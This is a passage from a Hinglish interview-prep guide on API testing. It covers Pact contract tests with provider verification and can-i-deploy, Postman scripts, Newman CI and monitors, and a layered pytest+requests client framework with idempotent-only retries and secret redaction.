# consumer/tests/test_sale_client_pact.py
"""
Ye test FRONTEND team likhti hai (ya frontend ke behalf pe).
Ye ek MOCK PROVIDER khada karta hai, expectations set karta hai,
consumer code ko us mock ke against chalata hai,
aur ek PACT FILE generate karta hai.
"""
import atexit
import pytest
from pact import Consumer, Provider, Like, Term, EachLike

# Mock provider — ye ek local HTTP server hai
pact = Consumer("merlin-web-frontend").has_pact_with(
    Provider("merlin-erp-api"),
    host_name="localhost",
    port=1234,
    pact_dir="./pacts",
)
pact.start_service()
atexit.register(pact.stop_service)


# ---- consumer ka actual production code (simplified) ----
class SaleClient:
    """Ye wahi code hai jo frontend production mein use karta hai."""
    def __init__(self, base_url):
        self.base_url = base_url

    def get_sale(self, sale_id, token):
        r = requests.get(f"{self.base_url}/api/v1/sales/{sale_id}",
                         headers={"Authorization": f"Bearer {token}",
                                  "Accept": "application/json"},
                         timeout=30)
        r.raise_for_status()
        data = r.json()
        # Frontend ki actual expectation — yahi contract ka core hai
        return {
            "id": data["id"],
            "status": data["status"],
            "total": data["totalPrice"],          # NON-NULL hona chahiye
            "lines": [
                {"id": li["id"], "desc": li["description"], "amount": li["amount"]}
                for li in data["lineItems"]
            ],
        }


def test_get_sale_contract():
    """
    Matchers ka matlab:
      Like(4500000)  -> "koi bhi integer, lekin INTEGER hona chahiye"
                        Value example hai, TYPE contract hai.
      Term(...)      -> regex se match karo
      EachLike(...)  -> array, jiska har element is shape ka ho

    Ye important hai: contract SHAPE aur TYPE pe hai, exact values pe nahi.
    Warna contract har data change pe toot jaayega.
    """
    expected = {
        "id":         Term(r"^s_[a-zA-Z0-9]+$", "s_1024"),
        "status":     Term(r"^(DRAFT|OPEN|CLOSED|CANCELLED)$", "OPEN"),
        "totalPrice": Like(4500000),      # <- INTEGER, aur non-null
        "currency":   Term(r"^[A-Z]{3}$", "INR"),
        "lineItems":  EachLike({
            "id":          Like("li_1"),
            "description": Like("Civil work — phase 2"),
            "amount":      Like(500000),
        }, minimum=1),                     # <- kam se kam 1 element
    }

    (pact
     .given("a sale s_1024 exists in OPEN status with line items")   # provider state
     .upon_receiving("a request for sale s_1024")
     .with_request(
         method="GET",
         path="/api/v1/sales/s_1024",
         headers={"Authorization": Term(r"^Bearer .+$", "Bearer test-token"),
                  "Accept": "application/json"},
     )
     .will_respond_with(
         status=200,
         headers={"Content-Type": "application/json"},
         body=expected,
     ))

    with pact:
        client = SaleClient("http://localhost:1234")
        result = client.get_sale("s_1024", token="test-token")

    # Consumer code ne mock response sahi parse kiya?
    assert result["id"] == "s_1024"
    assert result["total"] == 4500000
    assert result["total"] is not None       # [REAL] — yahi wo bug tha
    assert len(result["lines"]) >= 1
```

### Generated pact file

```json
// pacts/merlin-web-frontend-merlin-erp-api.json
{
  "consumer": {"name": "merlin-web-frontend"},
  "provider": {"name": "merlin-erp-api"},
  "interactions": [
    {
      "providerState": "a sale s_1024 exists in OPEN status with line items",
      "description": "a request for sale s_1024",
      "request": {
        "method": "GET",
        "path": "/api/v1/sales/s_1024",
        "headers": {"Authorization": "Bearer test-token", "Accept": "application/json"}
      },
      "response": {
        "status": 200,
        "headers": {"Content-Type": "application/json"},
        "body": {
          "id": "s_1024",
          "status": "OPEN",
          "totalPrice": 4500000,
          "currency": "INR",
          "lineItems": [{"id": "li_1", "description": "Civil work — phase 2", "amount": 500000}]
        },
        "matchingRules": {
          "$.body.id":                     {"match": "regex", "regex": "^s_[a-zA-Z0-9]+$"},
          "$.body.status":                 {"match": "regex", "regex": "^(DRAFT|OPEN|CLOSED|CANCELLED)$"},
          "$.body.totalPrice":             {"match": "type"},
          "$.body.lineItems":              {"match": "type", "min": 1},
          "$.body.lineItems[*].amount":    {"match": "type"}
        }
      }
    }
  ]
}
```

### Provider side — backend verify karta hai

```python
# provider/tests/test_pact_verification.py
"""
Ye test BACKEND team ke CI mein chalta hai.
Ye REAL provider ko start karta hai aur pact file ke against verify karta hai.

Provider states = "in bhi conditions mein" setup hooks.
"""
import pytest
from pact import Verifier


@pytest.fixture(scope="session")
def provider_states_endpoint(running_provider):
    """Provider ko ek special endpoint expose karna padta hai jo
    'given' states ko setup kare — sirf test profile mein enabled."""
    return f"{running_provider.url}/_pact/provider-states"


def test_provider_honours_all_consumer_contracts(running_provider, provider_states_endpoint):
    verifier = Verifier(
        provider="merlin-erp-api",
        provider_base_url=running_provider.url,
    )

    output, code = verifier.verify_with_broker(
        broker_url=os.environ["PACT_BROKER_URL"],
        broker_username=os.environ["PACT_BROKER_USER"],
        broker_password=os.environ["PACT_BROKER_PASSWORD"],

        provider_states_setup_url=provider_states_endpoint,

        # Ye provider ka version hai — broker mein record hota hai
        provider_app_version=os.environ["GIT_COMMIT"],
        publish_verification_results=True,

        # Sirf wo pacts verify karo jo actually deployed hain
        # — nahi to purane branches ke pacts build tod denge
        consumer_version_selectors=[
            {"mainBranch": True},
            {"deployed": True},
        ],
    )

    assert code == 0, f"Pact verification fail:\n{output}"
```

```kotlin
// Backend side — provider states setup (Kotlin/Spring)
// Ye sirf 'test' profile mein enabled hota hai
@RestController
@Profile("pact-test")
@RequestMapping("/_pact/provider-states")
class PactProviderStateController(
    private val saleRepo: SaleRepository,
    private val testDataFactory: TestDataFactory,
) {
    @PostMapping
    fun setupState(@RequestBody request: ProviderStateRequest) {
        when (request.state) {
            "a sale s_1024 exists in OPEN status with line items" -> {
                testDataFactory.createSale(
                    id = "s_1024",
                    status = SaleStatus.OPEN,
                    totalPrice = 4_500_000L,
                    lineItems = listOf(LineItem("li_1", "Civil work — phase 2", 500_000L)),
                )
            }
            "no sale exists with id s_9999" -> saleRepo.deleteById("s_9999")
            else -> throw IllegalArgumentException("Unknown state: ${request.state}")
        }
    }
}
```

### Ab wo [REAL] bug kaise pakda jaata

```
Backend developer commit karta hai:
  "Refactor: read totalPrice from estimate entity"

Provider verification CI mein chalti hai:
  - Provider state setup: sale s_1024 OPEN status mein banayi
  - Pact ka request replay hua: GET /api/v1/sales/s_1024
  - Provider ne diya: {"totalPrice": null, "lineItems": []}
  - Pact matcher: totalPrice should match type INTEGER
                  -> got null. TYPE MISMATCH.
                  -> lineItems should have minimum 1 element
                  -> got 0 elements. FAIL.

  ❌ PROVIDER BUILD FAILS

Merge nahi hua. Production tak pahuncha hi nahi.
```

**Yahi hai contract testing ki value:** ye us exact bug class ko pakadta hai jahan dono side
apne-apne tests pass kar rahe hain.

### Pact Broker aur "can-i-deploy"

```
Pact Broker = central store jahan pacts publish hote hain
              aur verification results record hote hain

Consumer CI:
  1. Pact test chalao -> pact file generate
  2. Broker pe publish karo (consumer version = git sha, branch tag)

Provider CI:
  1. Broker se saare relevant pacts fetch karo
  2. Real provider ke against verify karo
  3. Results wapas broker pe publish karo

Deploy se PEHLE — dono side:
  $ pact-broker can-i-deploy \
      --pacticipant merlin-erp-api \
      --version $GIT_COMMIT \
      --to-environment production

  -> "Computer says yes" agar saare consumers ke saath compatible hai
  -> "Computer says no" agar koi consumer contract satisfy nahi hota
```

```yaml
# .github/workflows/api-deploy.yml
- name: Verify pacts
  run: pytest provider/tests/test_pact_verification.py

- name: Can I deploy?
  run: |
    pact-broker can-i-deploy \
      --pacticipant merlin-erp-api \
      --version ${{ github.sha }} \
      --to-environment production \
      --retry-while-unknown 12 --retry-interval 10

- name: Deploy
  run: ./deploy.sh

- name: Record deployment
  run: |
    pact-broker record-deployment \
      --pacticipant merlin-erp-api \
      --version ${{ github.sha }} \
      --environment production
```

## 9.4 Contract testing kya NAHI karta

Ye batana important hai — warna interviewer sochega aap over-sell kar rahe ho.

| Contract testing pakadta hai | Contract testing NAHI pakadta |
|---|---|
| Field removed / renamed | Value galat hai (totalPrice = 999 instead of 4500000) |
| Type badal gaya | Business logic bug |
| Field null aa gaya jo non-null tha | Performance problem |
| Status code badal gaya | Security issue |
| Required field missing | Data corruption |
| Response shape drift | End-to-end user journey |

**Contract testing SHAPE ka agreement verify karta hai, BEHAVIOUR ka nahi.**

Isliye ye E2E tests ko replace nahi karta — usko **kam** karta hai. Aap 50 E2E tests ki jagah
5 rakh sakte ho, kyunki shape-level breakage contract tests pakad lete hain.

> **Interview answer (contract testing):**
>
> "Contract testing exists for a specific failure mode: both sides pass their own tests and
> the integration is still broken. The consumer tests against a mock it wrote, so it's testing
> its own assumption. The provider tests against inputs it constructed, so it's testing its
> own assumption. Nobody tests that the two assumptions agree.
>
> I've lived that exact failure. Our backend had fifty-seven passing integration tests
> covering token forgery, replay, expiry and cross-org access, and the end-to-end flow was
> still broken — because every test minted its own token and passed its own customerId. Each
> test verified the component against inputs the test itself created. The seam between
> components was never exercised. And separately, we had a customer-facing endpoint returning
> `totalPrice: null` with an empty `lineItems` array for a contract that had a real value.
> Both of those are precisely the class of bug contract testing is designed to catch.
>
> The consumer-driven part matters. In a provider-driven world the provider publishes a spec
> and hopes; it has no idea which fields consumers actually depend on, so removing an
> apparently unused field feels safe and isn't. In consumer-driven contracts the consumer
> declares what it needs, that becomes a pact file, and the provider's own CI verifies against
> it. So if a developer refactors the price read and it starts returning null, the *provider's*
> build fails before merge. The bug never reaches production.
>
> The mechanics: the consumer test runs a mock provider, and crucially the expectations use
> type matchers rather than exact values — 'an integer that looks like this', 'an array with
> at least one element of this shape'. That's what keeps the contract about shape rather than
> data, so it doesn't break every time the test data changes. On the provider side, the pact
> is replayed against the real running service, with provider-state hooks that set up the
> preconditions the pact declared. Results go back to a Pact Broker, and before either side
> deploys, `can-i-deploy` checks the version being deployed is compatible with everything
> currently in the target environment."

> **Cross-question: "Doesn't this just duplicate your OpenAPI spec?"**
>
> "It answers a different question. An OpenAPI spec describes what the provider *says* it
> offers, and it's a document maintained alongside the code, so it drifts. A pact describes
> what a consumer *actually uses*, and it's generated by running the consumer's real client
> code, so it can't drift from the consumer. And the verification step is the real difference —
> a spec is a document nobody executes; a pact is executed against the running provider in CI
> and fails the build. You can absolutely validate responses against OpenAPI too, and I'd do
> both, but only one of them tells you 'this specific change will break this specific
> consumer'."

> **Cross-question: "When would you not bother with Pact?"**
>
> "If the consumer and provider live in the same repo and deploy together, the contract can't
> drift — an integration test is simpler and gives more. If the provider is a third party, I
> can't make them verify anything, so contract testing degrades to schema snapshot testing on
> my side, which is worth doing but isn't Pact. And if the team can't maintain provider states,
> Pact becomes a maintenance burden that quietly gets disabled — I'd rather have three honest
> end-to-end tests than a contract suite everybody skips."

---

# PART 10 — Tooling

## 10.1 Postman — deep

Aap Postman jaante ho, isliye yahan wo cheezein hain jo interview mein "deep" lagti hain.

### Environments aur variable scopes

Postman mein **5 variable scopes** hain, precedence order mein (narrow wins):

```
1. Local        (script mein set, request ke baad gayab)
2. Data         (Collection Runner ki CSV/JSON file se)
3. Environment  (staging / prod / local — ye sabse zyada use hota hai)
4. Collection   (poori collection ke liye — jaise baseUrl)
5. Global       (sab collections mein — avoid karo, debug karna mushkil)
```

```
Environment: Merlin-Staging
  baseUrl        = https://staging.merlinai.co
  smEmail        = ritik.chaturvedi@merlinai.co
  smPassword     = {{$processEnv.MERLIN_SM_PASSWORD}}   <- SECRET type use karo
  accessToken    = (script se set hoga)
  tokenExpiresAt = (script se set hoga)
  projectId      = p_staging_001
```

**Secrets ke liye critical rule:** variable type ko **"secret"** set karo. Warna value plain
text mein export ho jaati hai aur agar aapne collection git mein commit ki, password repo
mein chala gaya.

### Pre-request script — auto token refresh

Ye sabse valuable Postman feature hai jo log nahi use karte. Har request se pehle chalta hai.

```javascript
// Collection-level Pre-request Script
// Har request pe chalta hai — token expire hone pe automatically refresh

const EXPIRY_BUFFER_MS = 60 * 1000;   // 1 min pehle refresh karo

const token     = pm.environment.get("accessToken");
const expiresAt = Number(pm.environment.get("tokenExpiresAt") || 0);
const now       = Date.now();

// Correlation id har request pe — logs correlate karne ke liye
pm.environment.set("requestId", 
    'pm-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8));

if (token && now < expiresAt - EXPIRY_BUFFER_MS) {
    console.log(`[auth] token valid for ${Math.round((expiresAt - now)/1000)}s`);
} else {
    console.log("[auth] token missing/expiring — logging in");

    pm.sendRequest({
        url: pm.environment.get("baseUrl") + "/api/v1/auth/login",
        method: "POST",
        header: { "Content-Type": "application/json" },
        body: {
            mode: "raw",
            raw: JSON.stringify({
                email:    pm.environment.get("smEmail"),
                password: pm.environment.get("smPassword"),
            }),
        },
    }, function (err, res) {
        if (err) {
            console.error("[auth] login request failed:", err);
            throw new Error("Cannot obtain token: " + err);
        }
        if (res.code !== 200) {
            console.error("[auth] login returned", res.code, res.text());
            throw new Error("Login failed with status " + res.code);
        }

        const data = res.json();
        pm.environment.set("accessToken", data.access_token);

        // JWT ka exp decode karke exact expiry set karo —
        // hardcoded duration guess karne se behtar
        try {
            const payload = JSON.parse(
                atob(data.access_token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/"))
            );
            pm.environment.set("tokenExpiresAt", payload.exp * 1000);
            pm.environment.set("orgId", payload.org);
            pm.environment.set("userId", payload.sub);
            console.log(`[auth] token refreshed, expires ${new Date(payload.exp * 1000)}`);
        } catch (e) {
            // Fallback agar decode fail ho
            pm.environment.set("tokenExpiresAt", Date.now() + 14 * 60 * 1000);
        }
    });
}
```

### Tests tab — meaningful assertions

```javascript
// GET /api/v1/budgets/{{budgetId}}/coverage — Tests tab

// ---------- Layer 1: status ----------
pm.test("Status is 200", () => pm.response.to.have.status(200));

// ---------- Layer 2: content type ----------
pm.test("Content-Type is JSON", () =>
    pm.expect(pm.response.headers.get("Content-Type")).to.include("application/json"));

// ---------- Layer 3: headers ----------
pm.test("Correlation id echoed", () =>
    pm.expect(pm.response.headers.get("X-Request-Id"))
      .to.eql(pm.environment.get("requestId")));

pm.test("Financial data not cacheable", () => {
    const cc = (pm.response.headers.get("Cache-Control") || "").toLowerCase();
    pm.expect(cc).to.satisfy(v => v.includes("no-store") || v.includes("private"));
});

// ---------- Layer 4: schema ----------
const schema = {
    type: "object",
    required: ["totalBudget", "carvedAmount", "remainingAmount", "coveragePercent", "carves"],
    additionalProperties: false,          // <- security test
    properties: {
        totalBudget:     { type: "integer", minimum: 0 },
        carvedAmount:    { type: "integer", minimum: 0 },
        remainingAmount: { type: "integer", minimum: 0 },
        coveragePercent: { type: "number", minimum: 0, maximum: 100 },
        carves: {
            type: "array",
            items: {
                type: "object",
                required: ["id", "scopeId", "amount"],
                additionalProperties: false,
                properties: {
                    id:      { type: "string" },
                    scopeId: { type: "string" },
                    amount:  { type: "integer", minimum: 0 },
                },
            },
        },
    },
};
pm.test("Schema matches", () => pm.response.to.have.jsonSchema(schema));

// ---------- Layer 5: business values (STRONGEST) ----------
const body = pm.response.json();

pm.test("Arithmetic invariant: carved + remaining == total", () =>
    pm.expect(body.carvedAmount + body.remainingAmount).to.eql(body.totalBudget));

pm.test("Sum of individual carves equals aggregate", () => {
    const sum = body.carves.reduce((acc, c) => acc + c.amount, 0);
    pm.expect(sum).to.eql(body.carvedAmount);
});

pm.test("Coverage percent matches the ratio", () => {
    const expected = body.totalBudget
        ? Math.round((body.carvedAmount / body.totalBudget) * 10000) / 100
        : 0;
    pm.expect(Math.abs(body.coveragePercent - expected)).to.be.below(0.01);
});

pm.test("No unexpected nulls", () => {
    const walk = (node, path) => {
        if (node === null) throw new Error(`null at ${path}`);
        if (typeof node === "object")
            Object.entries(node).forEach(([k, v]) => walk(v, `${path}.${k}`));
    };
    walk(body, "$");
});

// ---------- Layer 6: security ----------
pm.test("No internal fields leaked", () => {
    const forbidden = ["_id", "_class", "orgId", "internalMargin", "costPrice"];
    const text = pm.response.text();
    forbidden.forEach(f =>
        pm.expect(text, `field ${f} leaked`).to.not.include(`"${f}"`));
});

pm.test("Response time acceptable", () =>
    pm.expect(pm.response.responseTime).to.be.below(1500));

// ---------- chain: agli request ke liye variable set karo ----------
if (body.carves.length > 0) {
    pm.environment.set("firstCarveId", body.carves[0].id);
}
```

### Data-driven testing — Collection Runner + CSV

```csv
scopeId,amount,currency,expectedStatus,description
sc_civil,250000,INR,201,valid carve
sc_elec,1,INR,201,minimum amount
sc_plumb,0,INR,400,zero amount
sc_civil,-100,INR,400,negative
sc_x,250000,XYZ,400,invalid currency
sc_nonexistent,250000,INR,404,unknown scope
```

```javascript
// Request body — CSV columns ko variables ki tarah use karo
{
  "scopeId": "{{scopeId}}",
  "amount": {{amount}},
  "currency": "{{currency}}"
}

// Tests tab
pm.test(`${pm.iterationData.get("description")}`, () => {
    pm.response.to.have.status(Number(pm.iterationData.get("expectedStatus")));
});
```

### Newman in CI

```bash
npm install -g newman newman-reporter-htmlextra
```

```yaml
# .github/workflows/api-tests.yml
name: API Tests

on:
  push:
    branches: [main, develop]
  pull_request:
  schedule:
    - cron: "0 */4 * * *"      # har 4 ghante — staging health check

jobs:
  newman:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with: { node-version: "20" }

      - run: npm install -g newman newman-reporter-htmlextra

      - name: Run API collection
        run: |
          newman run collections/merlin-api.postman_collection.json \
            --environment environments/staging.postman_environment.json \
            --env-var "smPassword=${{ secrets.MERLIN_SM_PASSWORD }}" \
            --iteration-data data/carve-cases.csv \
            --reporters cli,htmlextra,junit \
            --reporter-htmlextra-export reports/api-report.html \
            --reporter-junit-export reports/junit.xml \
            --timeout-request 30000 \
            --delay-request 100 \
            --bail false \
            --color on

      - name: Publish report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: newman-report
          path: reports/

      - name: Publish test results
        if: always()
        uses: dorny/test-reporter@v1
        with:
          name: API Tests
          path: reports/junit.xml
          reporter: java-junit
```

**Important flags:**
- `--bail false` — sab tests chalne do, pehle failure pe ruko mat
- `--env-var` — secrets CI se inject karo, environment file mein commit MAT karo
- `--timeout-request` — hang hone se bachao
- `--delay-request` — rate limits se bachao

### Postman Monitors

Scheduled runs Postman ke cloud se. **CI se alag kyun:**

| CI (Newman) | Monitor |
|---|---|
| Code change pe chalta hai | Schedule pe chalta hai (har 5 min) |
| CI runner ke network se | **Alag-alag geographic regions se** |
| Deployment gate hai | **Production health check hai** |
| Failure = build fail | Failure = Slack/PagerDuty alert |

Monitors ka asli use: **production smoke tests**. 5 read-only requests jo har 5 minute chalti
hain aur alert karti hain agar API down ho.

### Mock servers

```
Use case 1: Frontend backend se pehle build ho raha hai
  - API design finalize karo
  - Mock server se examples serve karo
  - Frontend develop karta hai
  - Backend ready hone pe baseUrl switch

Use case 2: Third-party API ke error cases test karna
  - Payment gateway ka 503 real mein reproduce nahi kar sakte
  - Mock server se 503 serve karo
  - Apna retry logic test karo

Use case 3: Contract ka starting point
  - Mock ka example response = pact ka starting shape
```

**Mock server ka bada khatra — ye interview mein bolna:** mock aapke apne assumptions serve
karta hai. Agar aap mock ke against test karte ho, aap apni hi assumption verify kar rahe ho.
Yahi wo trap hai jisme frontend team fasi thi. Mock development ke liye theek hai, **final
verification ke liye nahi**.

### Postman ki limitations — kab pytest pe move karo

| Postman theek hai | pytest+requests behtar hai |
|---|---|
| Manual exploration | Version-controlled, reviewable tests |
| Quick API debugging | Complex test data setup/teardown |
| Non-programmers ko demo | Reusable helper functions, real code |
| Simple linear flows | Concurrency tests (ThreadPoolExecutor) |
| Ad-hoc smoke tests | Parametrized matrices (roles x endpoints) |
| Production monitoring | Custom assertions, database verification |
| — | Fixtures with proper scoping |
| — | Meaningful diffs in PR review |
| — | Same language as the rest of the automation |

> **Interview answer (Postman vs code):**
>
> "Postman is where I explore and debug — it's the fastest way to understand an unfamiliar
> endpoint, and pre-request scripts with automatic token refresh make that painless. I use it
> for production monitors too, because monitors run from multiple regions on a schedule, which
> CI doesn't give you.
>
> But I move regression suites into pytest and requests, and my reasons are concrete rather
> than stylistic. Postman collections are JSON, so a pull request diff is unreadable and
> nobody can review a test change. There's no clean way to share setup logic beyond copying
> scripts between requests. Concurrency tests are effectively impossible — I can't spawn a
> thread pool and fire twenty-five simultaneous carves to prove the race condition is handled.
> And parametrised matrices are awkward: my authorization suite is five roles crossed with a
> list of endpoints, which is a few lines in pytest and a maintenance problem in Postman.
>
> One thing I'd flag about mock servers specifically: they serve back your own assumptions.
> Testing a client against a mock you wrote proves your client parses your mock — it proves
> nothing about the real provider. That's exactly how a frontend team ends up with a green
> suite and a broken integration. Mocks are for unblocking development; they're not
> verification."

## 10.2 pytest + requests — full framework

### Layered architecture

```
tests/
├── conftest.py                 # fixtures — clients, test data
├── pytest.ini                  # markers, config
├── requirements.txt
│
├── framework/                  # LAYER 1: infrastructure
│   ├── __init__.py
│   ├── client.py               # ApiClient — session, retry, logging, timeout
│   ├── config.py               # env-driven config
│   ├── auth.py                 # token acquisition + caching
│   └── assertions.py           # custom assertion helpers
│
├── schemas/                    # LAYER 2: contracts
│   ├── common.py               # $defs — money, timestamp, pageMeta
│   ├── sale.py
│   ├── carve.py
│   └── error.py
│
├── data/                       # LAYER 3: test data
│   ├── builders.py             # fluent builders — SaleBuilder().open().build()
│   └── factories.py            # API-backed factories with cleanup
│
└── tests/                      # LAYER 4: actual tests
    ├── smoke/
    ├── functional/
    ├── security/
    └── contract/
```

### `framework/config.py`

```python
import os
from dataclasses import dataclass


@dataclass(frozen=True)
class Config:
    base_url: str
    timeout: float
    verify_ssl: bool
    max_retries: int
    log_bodies: bool

    @classmethod
    def from_env(cls) -> "Config":
        """Config env vars se — kabhi hardcode mat karo,
        aur secrets kabhi code mein mat rakho."""
        env = os.environ.get("TEST_ENV", "staging")
        base = {
            "local":   "http://localhost:8080",
            "staging": "https://staging.merlinai.co",
        }.get(env)
        if not base:
            raise ValueError(f"Unknown TEST_ENV={env}")

        # SAFETY RAIL — production ke against galti se chalne se roko
        if "prod" in (os.environ.get("API_BASE_URL") or base).lower():
            raise RuntimeError(
                "Ye suite production ke against nahi chal sakti. "
                "Isme destructive tests hain."
            )

        return cls(
            base_url=os.environ.get("API_BASE_URL", base).rstrip("/"),
            timeout=float(os.environ.get("API_TIMEOUT", "30")),
            verify_ssl=os.environ.get("VERIFY_SSL", "true").lower() == "true",
            max_retries=int(os.environ.get("API_MAX_RETRIES", "3")),
            log_bodies=os.environ.get("LOG_BODIES", "true").lower() == "true",
        )


CONFIG = Config.from_env()
```

### `framework/client.py` — the ApiClient

```python
"""
Reusable API client. Design goals:
  1. Session — connection reuse, isliye har request pe TCP+TLS handshake nahi
  2. Retry SIRF idempotent methods pe — POST retry karna duplicate bana sakta hai
  3. Structured logging — failure pe poora request/response
  4. Timeouts hamesha — bina timeout ke test forever hang kar sakta hai
  5. Correlation id — har request pe, taaki logs se match kar sakein
  6. Secret redaction — logs mein token print mat karo
"""
import json
import logging
import time
import uuid
from typing import Any, Optional

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

log = logging.getLogger("api")


REDACT_HEADERS = {"authorization", "cookie", "set-cookie", "x-api-key", "proxy-authorization"}


def _redact(headers: dict) -> dict:
    """Logs mein secrets kabhi mat likho — CI logs aksar widely visible hote hain."""
    out = {}
    for k, v in headers.items():
        if k.lower() in REDACT_HEADERS:
            out[k] = f"{str(v)[:12]}...<redacted len={len(str(v))}>"
        else:
            out[k] = v
    return out


class ApiResponseError(AssertionError):
    """Rich error jo failure ko debuggable banata hai."""
    def __init__(self, response: requests.Response, expected):
        req = response.request
        body = response.text[:2000]
        try:
            body = json.dumps(response.json(), indent=2)[:2000]
        except Exception:
            pass
        super().__init__(
            f"\n{'='*70}\n"
            f"Expected status {expected}, got {response.status_code}\n"
            f"{'='*70}\n"
            f"REQUEST:  {req.method} {req.url}\n"
            f"HEADERS:  {json.dumps(_redact(dict(req.headers)), indent=2)}\n"
            f"BODY:     {(req.body or b'')[:1000] if isinstance(req.body, bytes) else str(req.body)[:1000]}\n"
            f"{'-'*70}\n"
            f"RESPONSE: {response.status_code} in {response.elapsed.total_seconds()*1000:.0f}ms\n"
            f"HEADERS:  {json.dumps(dict(response.headers), indent=2)}\n"
            f"BODY:     {body}\n"
            f"REQ ID:   {req.headers.get('X-Request-Id')}   <- ye id logs mein dhoondo\n"
            f"{'='*70}\n"
        )


class ApiClient:
    # RETRY SIRF IN METHODS PE — ye sabse important design decision hai
    IDEMPOTENT_METHODS = frozenset({"GET", "HEAD", "OPTIONS", "PUT", "DELETE", "TRACE"})

    def __init__(self, base_url: str, token: Optional[str] = None,
                 timeout: float = 30.0, max_retries: int = 3,
                 verify_ssl: bool = True, extra_headers: Optional[dict] = None):
        self.base_url = base_url.rstrip("/")
        self.token = token
        self.timeout = timeout
        self.verify_ssl = verify_ssl

        self.session = requests.Session()
        self.session.headers.update({
            "Accept": "application/json",
            "User-Agent": "merlin-qa-pytest/1.0",
            **(extra_headers or {}),
        })
        if token:
            self.session.headers["Authorization"] = f"Bearer {token}"

        # Retry strategy
        retry = Retry(
            total=max_retries,
            backoff_factor=0.5,                     # 0.5s, 1s, 2s
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=self.IDEMPOTENT_METHODS,  # <- POST/PATCH RETRY NAHI HONGE
            respect_retry_after_header=True,          # 429 pe server ki baat maano
            raise_on_status=False,
        )
        adapter = HTTPAdapter(
            max_retries=retry,
            pool_connections=20,      # concurrency tests ke liye
            pool_maxsize=50,
        )
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)

    # ------------------------------------------------------------------ core

    def request(self, method: str, path: str, *,
                expected_status: Optional[int | tuple] = None,
                **kwargs) -> requests.Response:
        url = path if path.startswith("http") else f"{self.base_url}{path}"

        headers = kwargs.pop("headers", {}) or {}
        request_id = headers.get("X-Request-Id") or str(uuid.uuid4())
        headers["X-Request-Id"] = request_id

        kwargs.setdefault("timeout", self.timeout)
        kwargs.setdefault("verify", self.verify_ssl)

        log.info("--> %s %s [req=%s]", method, url, request_id)
        if kwargs.get("json") is not None:
            log.debug("    body: %s", json.dumps(kwargs["json"])[:1000])

        t0 = time.perf_counter()
        try:
            resp = self.session.request(method, url, headers=headers, **kwargs)
        except requests.exceptions.Timeout:
            log.error("<-- TIMEOUT after %.1fs [req=%s]", kwargs["timeout"], request_id)
            raise
        except requests.exceptions.ConnectionError as exc:
            log.error("<-- CONNECTION ERROR [req=%s]: %s", request_id, exc)
            raise
        elapsed = time.perf_counter() - t0

        log.info("<-- %s %s in %.0fms [req=%s]",
                 resp.status_code, url, elapsed * 1000, request_id)
        if resp.status_code >= 400:
            log.warning("    error body: %s", resp.text[:1000])

        if expected_status is not None:
            expected = (expected_status if isinstance(expected_status, tuple)
                        else (expected_status,))
            if resp.status_code not in expected:
                raise ApiResponseError(resp, expected)

        return resp

    # ------------------------------------------------------------- shortcuts

    def get(self, path, **kw):     return self.request("GET", path, **kw)
    def post(self, path, **kw):    return self.request("POST", path, **kw)
    def put(self, path, **kw):     return self.request("PUT", path, **kw)
    def patch(self, path, **kw):   return self.request("PATCH", path, **kw)
    def delete(self, path, **kw):  return self.request("DELETE", path, **kw)
    def head(self, path, **kw):    return self.request("HEAD", path, **kw)
    def options(self, path, **kw): return self.request("OPTIONS", path, **kw)

    # ------------------------------------------------------------- utilities

    @property
    def auth_headers(self) -> dict:
        return ({"Authorization": f"Bearer {self.token}"} if self.token else {})

    def as_role(self, token: str) -> "ApiClient":
        """Naya client same config ke saath, alag token — role matrix ke liye."""
        return ApiClient(self.base_url, token=token, timeout=self.timeout,
                         verify_ssl=self.verify_ssl)

    def post_idempotent(self, path, *, idempotency_key=None, **kw):
        """POST with idempotency key — SAFE to retry.
        Ye default POST se alag hai: yahan retry karna theek hai
        kyunki key server-side dedupe karta hai."""
        key = idempotency_key or str(uuid.uuid4())
        headers = {**kw.pop("headers", {}), "Idempotency-Key": key}
        last = None
        for attempt in range(3):
            try:
                last = self.request("POST", path, headers=headers, **kw)
                if last.status_code < 500:
                    return last
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                pass
            time.sleep(2 ** attempt)
        return last

    def close(self):
        self.session.close()

    def __enter__(self):  return self
    def __exit__(self, *a): self.close()
```

**Retry design ka justification — ye interview mein bolne layak hai:**

```
allowed_methods=IDEMPOTENT_METHODS  <- ye line sabse important hai

Agar POST retry hota:
  POST /carve  -> server ne process kiya, response bhejte waqt network toota
  retry        -> server ne DOBARA process kiya
  Result: DO carves. Financial data corrupt.

Isliye:
  - GET/PUT/DELETE  -> retry safe hai (idempotent)
  - POST/PATCH      -> retry NAHI, JAB TAK Idempotency-Key na ho
  - post_idempotent() -> explicit opt-in, key ke saath
```

### `framework/auth.py`

```python
import functools
import base64, json, time


@functools.lru_cache(maxsize=32)
def _login(base_url: str, email: str, password: str) -> str:
    """Session-scoped token cache. lru_cache se same credentials pe
    dobara login nahi hoga — 50 tests, 1 login."""
    r = requests.post(f"{base_url}/api/v1/auth/login",
                      json={"email": email, "password": password}, timeout=30)
    if r.status_code != 200:
        raise RuntimeError(f"Login failed for {email}: {r.status_code} {r.text[:300]}")
    return r.json()["access_token"]


def decode_jwt_unsafe(token: str) -> dict:
    """Signature verify kiye bina payload padho — testing ke liye."""
    payload_b64 = token.split(".")[1]
    payload_b64 += "=" * (-len(payload_b64) % 4)
    return json.loads(base64.urlsafe_b64decode(payload_b64))


def token_for(role: str) -> str:
    """Role ke hisaab se token. Credentials env se aati hain."""
    creds = {
        "ADMIN":         ("ADMIN_EMAIL", "ADMIN_PASSWORD"),
        "SALES_MANAGER": ("SM_EMAIL", "SM_PASSWORD"),
        "VIEWER":        ("VIEWER_EMAIL", "VIEWER_PASSWORD"),
        "OTHER_ORG":     ("OTHER_ORG_EMAIL", "OTHER_ORG_PASSWORD"),
    }[role]
    return _login(CONFIG.base_url, os.environ[creds[0]], os.environ[creds[1]])
```

### `pytest.ini`

```ini
[pytest]
testpaths = tests
python_files = test_*.py
python_classes = Test*
python_functions = test_*

addopts =
    -v
